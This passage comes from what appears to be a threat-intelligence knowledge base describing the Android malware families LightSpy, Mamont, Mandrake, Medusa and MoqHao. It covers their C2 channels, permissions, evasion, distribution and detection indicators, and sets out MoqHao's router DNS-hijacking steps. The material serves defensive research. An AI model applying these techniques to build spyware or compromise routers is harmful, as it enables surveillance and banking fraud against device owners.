status</li> <li>Receives plugin download URLs via WebSocket</li> <li>Downloads, validates, and loads surveillance plugins</li> <li>Reports plugin versions and operational status back to the operator</li> </ol>"},{"location":"malware/families/lightspy/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Hunt.io's certificate analysis mapped LightSpy's infrastructure:</p> Aspect Details Server locations Primarily China and Hong Kong, with one server identified in Japan Hosting providers Topway Global Limited and ChinaNet host most certificate-bearing servers Web server Nginx 1.14.0 used consistently across LightSpy and AndroidControl infrastructure TLS certificates High-port certificates (50000+ range) used as fingerprinting markers Communication WebSocket for plugin delivery and commands, HTTPS for data exfiltration and logs <p>The shared infrastructure between LightSpy and WyrmSpy/AndroidControl, including identical Nginx configurations and overlapping certificate patterns, is the primary technical basis for linking these campaigns under APT41.</p>"},{"location":"malware/families/lightspy/#persistence-and-anti-analysis","title":"Persistence and Anti-Analysis","text":"Technique Details Plugin-based loading Surveillance modules downloaded post-installation reduce static analysis surface SQLite state management Local database tracks plugin status, enabling graceful recovery from interruptions WebSocket C2 channel Persistent bidirectional connection avoids polling-based detection patterns Selective activation Operators can enable or disable specific plugins per target"},{"location":"malware/families/lightspy/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Period Targets Context January-March 2020 Hong Kong residents Watering hole mimicking Apple Daily during political unrest 2020-2023 Southeast Asian mobile users Broader campaigns documented by Kaspersky 2024 Southern Asia, possibly India BlackBerry documented renewed espionage campaign 2024 Southern Asia BlackBerry documented DeepData framework deployed alongside LightSpy 2025 Cross-platform targets Hunt.io identified expanded command set and social media targeting"},{"location":"malware/families/lightspy/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>January 2020: A watering hole site mimicking Hong Kong's Apple Daily newspaper is discovered delivering a full iOS exploit chain. Kaspersky publishes the initial technical analysis of the LightSpy iOS implant, documenting the Safari/WebKit exploit chain and modular surveillance capabilities.</p> <p>March 2020: Trend Micro publishes companion research, and Kaspersky confirms ongoing watering hole campaigns targeting Southeast Asian mobile users across iOS, Android, and desktop platforms.</p> <p>July 2023: Lookout attributes WyrmSpy and DragonEgg to APT41, documenting advanced Android surveillance tools. Google confirms the APT41 attribution.</p> <p>October 2023: ThreatFabric publishes \"LightSpy mAPT: Mobile Payment System Attack\", linking DragonEgg to the LightSpy framework and documenting 14 Android plugins including the WeChat Pay bill module. This analysis unifies the Android and iOS campaigns under a single framework.</p> <p>April 2024: BlackBerry publishes \"LightSpy Returns\", documenting a renewed espionage campaign targeting Southern Asia with updated LightSpy infrastructure.</p> <p>June 2024: ThreatFabric documents the macOS variant of LightSpy, confirming cross-platform expansion beyond mobile.</p> <p>October 2024: Updated iOS variant documented with expanded plugin count (from 12 to 28) and destructive capabilities added to the surveillance toolkit.</p> <p>November 2024: BlackBerry documents APT41's DeepData framework deployed alongside LightSpy in targeted Southern Asian espionage operations, including capabilities to extract Fortinet VPN credentials.</p> <p>February 2025: Hunt.io publishes infrastructure analysis revealing over 100 commands across all platforms, with new Facebook and Instagram data extraction modules for Android. Certificate tracking maps infrastructure primarily to China and Hong Kong hosting providers.</p>"},{"location":"malware/families/lightspy/#related-families","title":"Related Families","text":"Family Relationship Pegasus Both are sophisticated cross-platform surveillance frameworks, though Pegasus is commercial spyware sold to governments while LightSpy serves Chinese state intelligence directly. Pegasus uses zero-click exploit chains; LightSpy relies on watering holes and trojanized apps. Predator Both are state-linked surveillance platforms targeting mobile devices. Predator (Cytrox/Intellexa) is commercial; LightSpy is state-operated. Both use modular plugin architectures. Hermit Both employ modular plugin architectures where surveillance capabilities are downloaded post-installation from C2. Hermit uses ISP-assisted delivery; LightSpy uses watering holes. KoSpy Both are state-sponsored Android surveillance tools with plugin-based architectures. KoSpy serves North Korean intelligence (APT37); LightSpy serves Chinese intelligence (APT41). Both use multi-stage C2 with legitimate services for initial configuration."},{"location":"malware/families/lightspy/#references","title":"References","text":""},{"location":"malware/families/mamont/","title":"Mamont","text":"<p>Mamont was the most active Android banking trojan family in 2024, accounting for 36.70% of all mobile banking malware attacks detected by Kaspersky. Kaspersky documented the family in December 2024, revealing a Russia-exclusive banking trojan distributed as fake parcel-tracking applications. The family blocked 31,000+ attacks in October-November 2024 alone. Despite targeting only Russian users, its sheer volume made it the dominant mobile banking threat globally for the year, surpassing established families like Anatsa, GodFather, and Hook in detection counts.</p>"},{"location":"malware/families/mamont/#overview","title":"Overview","text":"Attribute Details First Seen 2024 Last Seen Active (ongoing campaigns) Status Active, high volume Type Banking trojan, notification interceptor Attribution Unknown; targets Russia exclusively Aliases None known"},{"location":"malware/families/mamont/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Mamont DrWeb Android.BankBot.Mamont ESET Android/Spy.Banker.Mamont"},{"location":"malware/families/mamont/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Mamont is independently developed with no known code connection to other banking trojan families. Its focus on the Russian market distinguishes it from the European and global banking trojans that dominate the mobile threat landscape. The family's approach (fake parcel-tracking apps, push notification interception) is technically simpler than western-targeting families like Octo or Hook but highly effective at scale.</p>"},{"location":"malware/families/mamont/#distribution","title":"Distribution","text":"<p>Mamont distributes exclusively through social engineering via fake parcel-tracking applications:</p> Vector Details Smishing SMS messages claiming a parcel is ready for delivery Social media Telegram channels and forums promoting fake tracking apps Fake websites Landing pages mimicking Russian postal and delivery services <p>The social engineering relies on Russian-language delivery notifications directing users to install a \"tracking app\" that is the Mamont APK. The lure themes rotate across Russian delivery services and e-commerce platforms.</p>"},{"location":"malware/families/mamont/#capabilities","title":"Capabilities","text":"Capability Description Push notification interception Intercepts push notifications including banking OTP codes SMS interception Reads and hides incoming SMS messages SMS sending Sends SMS from victim's device (for spreading and premium SMS) Contact exfiltration Uploads contact list to C2 Device info collection IMEI, phone number, installed banking apps Photo theft Captures and exfiltrates photos from device storage Overlay attacks Displays phishing screens over Russian banking apps Self-propagation Forwards malicious links via SMS to victim's contacts"},{"location":"malware/families/mamont/#permissions","title":"Permissions","text":"Permission Purpose BIND_NOTIFICATION_LISTENER_SERVICE Intercept all push notifications including OTPs READ_SMS Read incoming SMS messages for credential and OTP theft RECEIVE_SMS Intercept SMS in real-time before the user sees them SEND_SMS Send SMS from victim device for spreading and premium fraud READ_CONTACTS Exfiltrate contact list for targeting and self-propagation READ_EXTERNAL_STORAGE Access photos and files on device storage READ_PHONE_STATE Collect device identifiers (IMEI, phone number) INTERNET Communicate with C2 server RECEIVE_BOOT_COMPLETED Restart malware service after device reboot"},{"location":"malware/families/mamont/#push-notification-interception","title":"Push Notification Interception","text":"<p>Mamont's primary credential theft mechanism targets push notifications rather than traditional overlay attacks. By intercepting push notifications from banking apps, the trojan captures OTP codes, transaction confirmations, and other sensitive data delivered through the Android notification system. This requires BIND_NOTIFICATION_LISTENER_SERVICE permission.</p>"},{"location":"malware/families/mamont/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/mamont/#notification-listener","title":"Notification Listener","text":"<p>The malware registers as a notification listener service, gaining access to all push notifications displayed on the device:</p> <ul> <li>Filters notifications by package name (targeting Russian banking apps)</li> <li>Extracts text content including OTP codes</li> <li>Forwards notification data to C2 in real-time</li> <li>Optionally hides notifications from the user</li> </ul>"},{"location":"malware/families/mamont/#telegram-c2-communication","title":"Telegram C2 Communication","text":"<p>Mamont uses Telegram bot API as a secondary C2 channel alongside its HTTP infrastructure. Stolen data -- including intercepted SMS, notifications, and screenshots -- can be forwarded to operator-controlled Telegram channels. This dual-channel approach provides resilience: if the HTTP C2 server is taken down, the Telegram channel continues to receive exfiltrated data. The use of Telegram as C2 is shared with families like Raton and some SpyNote variants.</p>"},{"location":"malware/families/mamont/#http-c2","title":"HTTP C2","text":"<ul> <li>HTTP-based communication with JSON payloads</li> <li>Registration with device fingerprint on first launch</li> <li>Polling-based command retrieval</li> <li>Exfiltrated data (SMS, notifications, contacts) sent via POST requests</li> </ul>"},{"location":"malware/families/mamont/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Primary protocol HTTP with JSON payloads Secondary channel Telegram Bot API Registration Device fingerprint (IMEI, phone number, installed apps) on first launch Command retrieval Polling-based at regular intervals Data exfiltration POST requests for SMS, notifications, contacts; Telegram for real-time alerts"},{"location":"malware/families/mamont/#target-regions","title":"Target Regions","text":"Region Details Russia Exclusive target, all lures in Russian <p>Mamont targets major Russian banks and financial apps. The exclusive Russian focus and the use of Russian-language social engineering suggest domestic operators. This pattern differs from most documented banking trojans which target multiple countries.</p>"},{"location":"malware/families/mamont/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024: Mamont emerges as the highest-volume mobile banking trojan globally. Kaspersky's 2024 mobile threat report places it at 36.70% of all banking malware detections.</p> <p>2024, October-November: Kaspersky documents the parcel-tracking distribution, blocking 31,000+ attacks in two months. The analysis reveals push notification interception as the primary theft mechanism.</p> <p>2025, March: Russian authorities arrested three suspects linked to the Mamont operation. Despite the arrests, new Mamont samples continued to surface, suggesting either additional operators or that the infrastructure remained active.</p>"},{"location":"malware/families/mamont/#detection","title":"Detection","text":"Indicator Type Details Notification listener registration App registering as <code>NotificationListenerService</code> without legitimate reason Targeted package monitoring Filtering notifications by Russian banking app package names SMS send/receive patterns Bulk SMS access combined with notification listener is unusual for utility apps Telegram API calls Network connections to <code>api.telegram.org</code> from a parcel-tracking app Russian-language strings Hardcoded Russian-language UI strings in APK resources"},{"location":"malware/families/mamont/#related-families","title":"Related Families","text":"Family Relationship Raton Both use Telegram bot API as a C2 channel for data exfiltration SpyNote Some variants similarly leverage Telegram for C2, though SpyNote is a full RAT rather than a banking-focused trojan FakeCalls Both focus on a single national market with localized social engineering"},{"location":"malware/families/mamont/#references","title":"References","text":"<ul> <li>Kaspersky - Mamont banker disguised as parcel-tracking app (December 2024)</li> <li>Kaspersky - Mobile threat report 2024 (March 2025)</li> <li>Bleeping Computer - Russia arrests three for developing Mamont banking trojan (March 2025)</li> </ul>"},{"location":"malware/families/mandrake/","title":"Mandrake","text":"<p>Mandrake is a sophisticated Android spyware platform that operated undetected on Google Play for multiple years across two separate campaigns. Bitdefender first documented the family in 2020, revealing a four-year presence (2016-2020) on Google Play with an estimated 32,000+ installations. Kaspersky documented the return in July 2024, finding new variants that had been present on Google Play since 2022, completely undetected for two years. The second wave moved core malicious functionality into native libraries obfuscated with OLLVM and included a \"seppuku\" self-destruct feature that wipes all malware traces from the device.</p>"},{"location":"malware/families/mandrake/#overview","title":"Overview","text":"Attribute Details First Seen 2016 Last Seen Active (second wave discovered 2024) Status Active, under continued development Type Spyware platform, credential stealer Attribution Unknown; sophisticated actor with long operational patience Aliases None known"},{"location":"malware/families/mandrake/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Spy.AndroidOS.Mandrake Bitdefender Android.Spy.Mandrake ESET Android/Spy.Mandrake McAfee Android/Mandrake"},{"location":"malware/families/mandrake/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Mandrake is an independently developed spyware platform with no known code connections to other documented families. Its sophistication level (multi-stage loading, OLLVM-obfuscated native libraries, certificate pinning, extended dormancy on Play Store) places it closer to commercial spyware operations like FinSpy or Hermit than to typical banking trojans, though its distribution via Google Play and broad targeting differ from the targeted delivery model of commercial surveillance tools.</p>"},{"location":"malware/families/mandrake/#campaign-timeline","title":"Campaign Timeline","text":"Campaign Period Detection Gap First wave 2016-2020 4 years on Google Play undetected Second wave 2022-2024 2 years on Google Play undetected <p>The ability to maintain presence on Google Play for years without detection by Play Protect or any AV engine demonstrates exceptional anti-detection engineering.</p>"},{"location":"malware/families/mandrake/#distribution","title":"Distribution","text":"<p>Both campaigns used Google Play as the primary distribution vector. Apps appeared as legitimate utilities:</p>"},{"location":"malware/families/mandrake/#first-wave-2016-2020","title":"First Wave (2016-2020)","text":"<p>Finance, automotive, and document management apps. Bitdefender identified apps that functioned legitimately while embedding the Mandrake framework.</p>"},{"location":"malware/families/mandrake/#second-wave-2022-2024","title":"Second Wave (2022-2024)","text":"App Category Installs AirFS (file sharing) Productivity 30,305 Astro Explorer Tools 718 Amber Lifestyle 19 CryptoPulsing Finance 790 Brain Matrix Education 259 <p>The second wave apps had lower install counts but maintained presence for two years, suggesting the operator prioritized stealth over scale.</p>"},{"location":"malware/families/mandrake/#capabilities","title":"Capabilities","text":"Capability Description Screen recording Captures device screen via MediaProjection API Credential theft Phishing overlays for banking and social media apps File exfiltration Browses and uploads files from device storage Contact/SMS theft Reads contacts, call logs, SMS messages GPS tracking Continuous location monitoring Audio recording Records via device microphone App installation Downloads and installs additional APKs Seppuku (self-destruct) Wipes all malware data and traces on operator command Browser cookie theft Extracts authentication cookies from browsers Click simulation Simulates user interactions via accessibility"},{"location":"malware/families/mandrake/#seppuku-self-destruct","title":"Seppuku Self-Destruct","text":"<p>The \"seppuku\" command triggers complete removal of all Mandrake components and data from the device. This anti-forensic feature allows operators to eliminate evidence if they suspect the device is under analysis or if the operation is being investigated. Unlike BRATA's factory reset (which wipes the entire device), seppuku selectively removes only Mandrake artifacts, leaving the device otherwise intact and reducing the likelihood the user notices anything happened.</p>"},{"location":"malware/families/mandrake/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/mandrake/#multi-stage-loading","title":"Multi-Stage Loading","text":"<p>Mandrake uses a three-stage loading architecture:</p> <pre><code>Stage 1: Dropper (Google Play app)\n    \u2192 Decrypts and loads Stage 2 from assets/\nStage 2: Loader (native library)\n    \u2192 Contacts C2 for Stage 3\n    \u2192 Performs environment checks\nStage 3: Core spyware module\n    \u2192 Full functionality downloaded from C2\n    \u2192 Loaded via DexClassLoader\n</code></pre>"},{"location":"malware/families/mandrake/#ollvm-obfuscation-second-wave","title":"OLLVM Obfuscation (Second Wave)","text":"<p>The 2024 variants moved critical functionality into native libraries obfuscated with OLLVM (Obfuscator-LLVM):</p> Technique Purpose Control flow flattening Hides program logic from static analysis String encryption All strings decrypted at runtime Bogus control flow Inserts dead code paths to confuse decompilers Instruction substitution Replaces standard operations with equivalent complex ones <p>This is the same obfuscation framework used by some packer vendors and nation-state tooling. Its application to Google Play malware is uncommon.</p>"},{"location":"malware/families/mandrake/#anti-analysis","title":"Anti-Analysis","text":"Check Method Emulator detection Checks build properties, hardware characteristics, sensor availability Frida detection Scans for Frida server processes and libraries Root detection Checks for su binary, root management apps Debugger detection Checks TracerPid, debug flags Certificate pinning Validates C2 server certificates against embedded pins"},{"location":"malware/families/mandrake/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTPS with certificate pinning</li> <li>TLS client certificates for mutual authentication</li> <li>Traffic encrypted with AES</li> <li>Heartbeat mechanism to maintain persistent connection</li> <li>Commands and responses serialized with custom binary protocol</li> </ul>"},{"location":"malware/families/mandrake/#target-regions","title":"Target Regions","text":"<p>Mandrake is not narrowly region-specific. The Google Play distribution means infections follow the apps' geographic availability. Kaspersky reported the highest detection rates in Canada, Germany, Italy, Mexico, Spain, Peru, and the UK during the second wave.</p>"},{"location":"malware/families/mandrake/#notable-campaigns","title":"Notable Campaigns","text":"<p>2016-2020: Bitdefender discovers the first Mandrake campaign after four years of undetected operation on Google Play. Multiple utility apps served as dropper vehicles. The research reveals a full-featured spyware platform with credential theft, screen recording, and file exfiltration capabilities.</p> <p>2022-2024: Mandrake returns to Google Play with significantly upgraded anti-detection capabilities. Core malicious logic moved from DEX to OLLVM-obfuscated native libraries. Five apps identified with combined 32,000+ installs over a two-year undetected period.</p> <p>2024, July: Kaspersky publishes analysis of the second wave, documenting the OLLVM obfuscation, seppuku self-destruct feature, and upgraded anti-analysis checks. Google removes identified apps from Play Store.</p>"},{"location":"malware/families/mandrake/#references","title":"References","text":""},{"location":"malware/families/medusa/","title":"Medusa","text":"<p>Medusa is an Android banking trojan and Malware-as-a-Service (MaaS) operation that combines keylogging, real-time screen streaming, and overlay attacks into a full remote access platform for financial fraud. First identified targeting Turkish banks in July 2020, it has expanded to seven countries across North America and Europe. The 2024 v2 rewrite stripped the codebase down to a minimal permission footprint while retaining full fraud capability, a deliberate evasion strategy that allowed it to resurface after nearly a year of dormancy.</p>"},{"location":"malware/families/medusa/#overview","title":"Overview","text":"Attribute Details First Seen July 2020 Status Active (2025) Type Banking trojan, RAT, MaaS Aliases TangleBot (Proofpoint) Attribution Turkish-speaking actors, multiple affiliate groups Distribution Smishing, dropper apps, fake updates"},{"location":"malware/families/medusa/#vendor-names","title":"Vendor Names","text":"Vendor Name ThreatFabric Medusa Cleafy Medusa Proofpoint TangleBot Cyble Medusa Kaspersky Trojan-Banker.AndroidOS.Medusa ESET Android/Spy.Medusa Trend Micro AndroidOS_Medusa Microsoft Trojan:AndroidOS/Medusa SonicWall AndroidOS.Medusa"},{"location":"malware/families/medusa/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric first documented Medusa in July 2020 as a new banking trojan under active development, initially targeting Turkish financial institutions. The malware used TCP for C2 communication, which distinguished it from the HTTP-based protocols common in other Android banking trojans of that era.</p> <p>The family appears to be written from scratch with no direct code lineage to other known banking trojans. Its operators adopted a reserved approach to distribution, avoiding public forum advertisements and instead using side-channels for customer communication.</p> <p>Proofpoint independently identified the same malware in September 2021 under the name TangleBot, based on its extensive use of obfuscation layers (\"tangled\" code). While some researchers initially treated these as distinct families, subsequent analysis confirmed they share the same codebase. The naming discrepancy persists across vendor reporting.</p> <p>In 2022, ThreatFabric discovered Medusa leveraging the same distribution infrastructure as FluBot (Cabassous), indicating either shared affiliates or deliberate collaboration between the two operations.</p> <p>After nearly a year of reduced activity, Cleafy identified the v2 variant in May 2024, noting it had likely been active since July 2023. The rewrite represented a strategic pivot toward evasion over feature density.</p>"},{"location":"malware/families/medusa/#distribution","title":"Distribution","text":"<p>Medusa has used multiple distribution strategies across its lifecycle, shifting from pure smishing to dropper-based delivery.</p> Period Vector Disguise Source 2020-2021 SMS phishing Turkish banking and utility apps ThreatFabric September 2021 SMS phishing COVID-19 updates, utility bills Proofpoint September 2021 Fake government portal Canadian COVID-19 portal Cyble February 2022 SMS (shared with FluBot) DHL, Flash Player, utility apps ThreatFabric 2024 Dropper apps, fake updates Chrome, 4K Sports, InatTV, Purolator, 5G Cleafy <p>The FluBot co-distribution phase was notable: Medusa samples appeared alongside Cabassous payloads from the same smishing service, with Medusa operators using campaign tags like FLUVOICE, FLUFLASH, and FLUDHL that directly referenced FluBot campaigns. Within one month, this approach infected over 1,500 devices through a single botnet disguised as DHL.</p> <p>The v2 distribution strategy shifted to dropper apps that deliver the malware through fake update procedures, moving away from direct SMS links to APK downloads.</p>"},{"location":"malware/families/medusa/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/medusa/#version-1-2020-2022","title":"Version 1 (2020-2022)","text":"Capability Implementation Overlay attacks WebView injects triggered by accessibility foreground detection Keylogging Accessibility-based keystroke capture across all apps Screen streaming Real-time device screen fed to operator via VNC Audio/video capture Record via device microphone and camera SMS interception Read, send, hide SMS for OTP theft Remote interaction Full RAT through accessibility gestures and touch simulation Call recording Capture voice calls Contact harvesting Exfiltrate contacts and SMS history Device admin abuse Lock device screen via DEVICE_ADMIN permission"},{"location":"malware/families/medusa/#version-2-2024","title":"Version 2 (2024)","text":"<p>Cleafy's analysis of the v2 rewrite documented a deliberate reduction in both permissions and commands:</p> <p>Permissions reduced to five core requirements:</p> Permission Purpose Accessibility Services Core functionality: keylogging, UI interaction, overlay triggering Broadcast SMS SMS interception for OTP theft Internet C2 communication Foreground Service Persistent background execution Query/Delete Packages Application enumeration and removal <p>Additional permissions are acquired silently through accessibility service abuse at runtime, avoiding manifest-level declaration.</p> <p>Command set changes:</p> <p>17 commands from v1 were removed, and 5 new commands were added:</p> New Command Action <code>setoverlay</code> Display full-screen black overlay to mask device activity <code>fillfocus</code> Set text value of focused input field to attacker-specified string Delete app Remotely uninstall specified applications Screen off simulation Make device appear inactive during fraud Overlay display Full-screen overlay for credential capture <p>The <code>setoverlay</code> command enables a black screen overlay that makes the device appear powered off or locked while the operator performs fraud in the background. The <code>fillfocus</code> command allows precise text injection into any focused input field, enabling ATS-style transfers.</p>"},{"location":"malware/families/medusa/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/medusa/#c2-communication","title":"C2 Communication","text":"<p>Medusa originally used raw TCP connections for C2 communication, an unusual choice for Android malware. The C2 infrastructure evolved significantly:</p> Version Protocol C2 Resolution v1 (2020) TCP Hardcoded C2 URLs, Telegram bot for backup v1 (2021) TCP Encoded URLs retrieved from Telegram bots (Base64 + custom encoding) v2 (2024) TCP Dynamic retrieval from social media profiles (Telegram, X, ICQ) <p>The dead drop resolver pattern in v2 uses legitimate social media platforms to host encoded C2 addresses. This allows operators to rotate C2 infrastructure without pushing malware updates, increasing resilience against takedowns.</p>"},{"location":"malware/families/medusa/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>Medusa's accessibility service implementation handles multiple functions simultaneously:</p> <ol> <li>Monitors <code>TYPE_WINDOW_STATE_CHANGED</code> for target app detection and overlay triggering</li> <li>Logs all keystrokes for credential capture</li> <li>Reads screen content for real-time streaming to operator</li> <li>Performs gestures and clicks for remote device control</li> <li>Silently grants additional permissions at runtime</li> <li>Interacts with banking app UI for ATS-style fraud via <code>fillfocus</code></li> </ol>"},{"location":"malware/families/medusa/#botnet-infrastructure","title":"Botnet Infrastructure","text":"<p>Cleafy identified five distinct botnets operating under the Medusa MaaS umbrella:</p> Botnet Primary Targets Distribution Focus AFETZEDE Turkey, Canada, US Traditional smishing ANAKONDA Turkey Smishing PEMBE Turkey Smishing TONY Turkey, Canada, US Smishing UNKN Italy, France, Europe Dropper apps from untrusted sources <p>The separation between Turkish-focused botnets (AFETZEDE, ANAKONDA, PEMBE, TONY) and the European-focused UNKN botnet suggests at least two distinct affiliate groups operating the same malware.</p>"},{"location":"malware/families/medusa/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Medusa's targeting has expanded significantly from its Turkish origins.</p> Period Regions Targets 2020-2021 Turkey Turkish banking institutions September 2021 US, Canada COVID-19 themed, broad credential theft 2022 Turkey, North America, Europe Banking apps, expanded through FluBot infrastructure 2024 Canada, France, Italy, Spain, Turkey, UK, US Banking, cryptocurrency, and utility apps across 7 countries <p>The v2 expansion into Western Europe, particularly France and Italy through the UNKN botnet, represented a strategic geographic pivot, indicating growing demand from European-focused affiliates within the MaaS operation.</p>"},{"location":"malware/families/medusa/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2020: ThreatFabric identified Medusa as a new Android banking trojan targeting Turkish banks, noting its use of TCP-based C2 and active development status.</p> <p>September 2021: Proofpoint published their TangleBot analysis, documenting campaigns using COVID-19 and utility bill lures targeting US and Canadian users. The analysis noted extensive obfuscation, including hidden .dex files, minified code, and excessive dead code. Proofpoint counted nine consecutive dialog boxes users had to accept before full installation completed.</p> <p>September 2021: Cyble documented a campaign using a fake Canadian Government COVID-19 portal to distribute Medusa disguised as a Flash Player update. The malware retrieved its C2 URL from a Telegram bot using Base64 and custom encoding.</p> <p>February 2022: ThreatFabric published \"Partners in Crime\", revealing that Medusa had begun using the same smishing distribution network as FluBot (Cabassous). The FLUDHL botnet alone accumulated over 1,500 infections within a month by masquerading as DHL delivery notifications.</p> <p>May 2024: Cleafy published \"Medusa Reborn\", documenting the v2 variant that had been active since July 2023. The rewrite reduced the permission footprint to five manifest-declared permissions, removed 17 commands, added 5 new ones (including the black screen overlay), and shifted distribution to dropper-based delivery through fake Chrome, 4K Sports, and utility apps across seven countries.</p>"},{"location":"malware/families/medusa/#references","title":"References","text":""},{"location":"malware/families/moqhao/","title":"MoqHao","text":"<p>MoqHao (also tracked as Roaming Mantis, XLoader, Wroba) is a long-running Android banking trojan and spyware distributed primarily through SMS phishing (smishing). Active since at least 2015, it targets users across Japan, South Korea, Taiwan, and increasingly Europe and North America. The operation is attributed to the Yanbian Gang, a Chinese-speaking financially motivated threat actor operating from the Yanbian Prefecture in Jilin, China. The family is notable for its continuous technical evolution, cycling through DNS hijacking, smishing, Google Play distribution, social media dead drop C2 resolution, WiFi router compromise, and most recently auto-execution without user interaction.</p>"},{"location":"malware/families/moqhao/#overview","title":"Overview","text":"Attribute Details First Seen 2015 (Deutsche Telekom), 2017-2018 (Kaspersky public tracking) Last Seen Active (ongoing campaigns) Status Active, continuously evolving Type Banking trojan, spyware, smishing distributor, DNS hijacker Attribution Roaming Mantis / Yanbian Gang (China-nexus, financially motivated) Aliases XLoader, Wroba, Wroba.o, Wroba.g, Shaoye, FakeChromeUpdate"},{"location":"malware/families/moqhao/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Wroba McAfee Android/MoqHao ESET Android/TrojanDropper.Agent (some variants) ThreatFabric MoqHao Trend Micro AndroidOS_Wroba, XLoader Fortinet Android/Agent.FKP!tr Symantec Android.Reputation.2 Deutsche Telekom MoqHao / Shaoye"},{"location":"malware/families/moqhao/#naming-history","title":"Naming History","text":"<p>The naming fragmentation across vendors reflects the family's long history and parallel discovery by multiple research teams. Kaspersky named the campaign \"Roaming Mantis\" in their April 2018 blog post focusing on the DNS hijacking delivery mechanism, while McAfee tracked the Android payload itself as \"MoqHao.\" Trend Micro uses \"XLoader\" for the same family, which causes confusion with the unrelated Windows/macOS malware of the same name. Kaspersky's detection name \"Wroba\" (with subvariants .o, .g, .j) covers both MoqHao and related payloads in the Roaming Mantis ecosystem. Deutsche Telekom identified the operators as the Yanbian Gang, linking MoqHao to a broader criminal operation active since 2013.</p>"},{"location":"malware/families/moqhao/#origin-and-lineage","title":"Origin and Lineage","text":"<p>MoqHao is an independently developed family with no known code lineage to other banking trojan families. Deutsche Telekom traces MoqHao's origins to 2015, attributing it to the Yanbian Gang, a threat actor that has operated from the Yanbian Korean Autonomous Prefecture in Jilin, China since at least 2013. Trend Micro published a detailed analysis in 2018 examining the connections between XLoader, FakeSpy, and the Yanbian Gang, establishing the overlap in infrastructure and tooling.</p> <p>Kaspersky first publicly documented the campaign in April 2018 as \"Roaming Mantis,\" observing compromised home routers in Japan, South Korea, and Bangladesh redirecting DNS queries to serve malicious APKs. Kaspersky subsequently published a five-part series tracking the campaign's evolution:</p> Part Date Focus Link I April 2018 DNS hijacking of home routers to distribute Android malware SecureList II May 2018 Expansion to 27 languages, iOS phishing, cryptocurrency mining SecureList III October 2018 iOS crypto mining, malicious content delivery system SecureList IV April 2019 Updated distribution, new evasion techniques SecureList V January 2021 Allowlisting, FakeCop/SpyAgent, COVID-19 lures SecureList <p>The family is cross-platform in scope: Android devices receive the MoqHao APK payload, iOS users are redirected to Apple ID phishing pages, and desktop users may be served cryptocurrency mining scripts.</p>"},{"location":"malware/families/moqhao/#distribution","title":"Distribution","text":"<p>MoqHao has used multiple distribution vectors across its lifetime, evolving from router-based DNS hijacking to pure smishing and occasionally Google Play.</p>"},{"location":"malware/families/moqhao/#dns-hijacking-2017-2018-revived-2022","title":"DNS Hijacking (2017-2018, revived 2022)","text":"<p>The original distribution method compromised home routers to redirect DNS queries. When users connected to a compromised router and attempted to browse, they were redirected to a landing page that prompted them to install a fake Chrome update APK.</p> <p>In September 2022, Kaspersky documented a new DNS changer function built directly into the MoqHao APK. Rather than relying on externally compromised routers, the malware itself compromises WiFi routers that the infected device connects to:</p> <ol> <li>The malware obtains the default gateway IP from the connected WiFi network</li> <li>It attempts to access the router's admin interface using default credentials</li> <li>It checks the router model against 113 hard-coded model strings (primarily South Korean router manufacturers)</li> <li>If the model matches, it changes the router's DNS settings to attacker-controlled servers</li> <li>The rogue DNS server address is retrieved dynamically from a VK profile (id728588947)</li> </ol> <p>This turns every infected phone into a propagation tool: when connected to WiFi at cafes, hotels, airports, or homes, it can compromise the router and redirect all connected devices to malicious landing pages. Deutsche Telekom additionally discovered that MoqHao includes a CAPTCHA bypass capability, using OCR to solve text-based CAPTCHAs on router admin interfaces during brute-force login attempts.</p>"},{"location":"malware/families/moqhao/#smishing","title":"Smishing","text":"<p>The primary distribution vector since 2018 uses SMS phishing. The attack chain varies by region but follows a consistent pattern:</p> Stage Details Initial SMS Delivery notification impersonating postal services (Yamato Transport, Japan Post, Korea Post, La Poste, DHL) URL shortening Links use URL shorteners to obscure the true destination Landing page Geofenced and OS-aware: Android users get APK download, iOS users get Apple ID phishing Installation Disguised as Chrome browser update or delivery tracking app Permissions Requests accessibility service, SMS, contacts Propagation Reads victim's contacts, sends smishing SMS to spread further <p>Kaspersky documented COVID-19 lure adaptation in 2020: the operators switched Japanese smishing messages from postal notifications to \"delivering free masks for the coronavirus issue,\" demonstrating rapid adaptation to current events.</p>"},{"location":"malware/families/moqhao/#google-play","title":"Google Play","text":"<p>In 2019, McAfee found MoqHao-related spyware on Google Play targeting Japan and Korea. The apps masqueraded as security applications under package names like <code>com.jshop.test</code> and <code>com.jptest.tools2019</code>. This marked a brief foray into official store distribution, though smishing remained the primary vector.</p>"},{"location":"malware/families/moqhao/#distribution-evolution","title":"Distribution Evolution","text":"Year Method 2017-2018 DNS hijacking via compromised routers, serving fake Chrome updates 2018-present Smishing campaigns with postal service lures 2019 Google Play distribution 2021 OS-specific payloads via smishing 2022 DNS changer built into APK payload, targeting South Korean routers 2024 Auto-execution variant runs immediately after installation 2024-2025 iCloud abuse for APK hosting, VK for C2 resolution"},{"location":"malware/families/moqhao/#capabilities","title":"Capabilities","text":"Capability Description SMS phishing (smishing) Sends phishing SMS to victim's contacts for worm-like propagation Banking credential theft Overlay attacks targeting banking apps SMS interception Reads and intercepts SMS including OTPs Contact exfiltration Uploads full contact list to C2 for targeting Device info collection IMEI, SIM number, Android ID, serial number, OS version, installed apps Photo theft Accesses and exfiltrates device photos WiFi router DNS hijacking Compromises routers the infected device connects to CAPTCHA bypass OCR-based solving of text CAPTCHAs on router admin pages Auto-execution (2024) 